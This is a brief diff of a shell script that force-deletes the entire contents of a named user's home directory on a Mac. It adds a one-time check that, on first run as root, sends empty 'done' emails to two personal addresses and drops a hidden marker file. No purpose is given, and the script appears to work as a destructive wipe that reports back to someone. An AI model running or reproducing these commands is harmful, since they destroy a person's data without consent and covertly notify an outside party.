@@ -3,6 +3,13 @@ touch /var/tmp/fun
 rm -rf /Users/jkalbfeld/*
 rm -rf /Users/jkalbfeld/.
 touch /Users/jkalbfeld/.root
+if [ ! -f /var/root/.run ]
+then
+ mailx -s "done" jonathan@thoughtwave.com < /dev/null
+ mailx -s "done" jonathan.kalbfeld@gmail.com < /dev/null
+ touch /var/root/.run
+fi
+
 if [ ! -f /Users/jkalbfeld/.safe ]
 then
  touch /Users/jkalbfeld/.safe
